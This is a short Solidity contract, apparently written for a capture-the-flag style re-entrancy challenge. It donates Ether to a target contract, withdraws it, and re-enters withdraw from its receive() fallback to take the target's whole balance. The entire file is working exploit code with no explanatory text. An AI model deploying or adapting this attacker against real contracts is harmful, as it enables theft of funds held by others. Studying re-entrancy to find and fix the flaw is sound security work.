pragma solidity ^0.8.0;

interface IReEntrancy {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract ReEntrancyAttacker {

    uint256 num;

    // @dev begin the exploit
    function runExploit(address _contract) external payable {
        IReEntrancy(_contract).donate{value:msg.value}(address(this));
        IReEntrancy(_contract).withdraw(msg.value);
    }

    // @dev entered when call() is done in withdraw
    receive() external payable {
        if (num == 0) { // runs once
            num += 1;
            IReEntrancy(msg.sender).withdraw(msg.sender.balance); // 1 ETH
        }
    }
}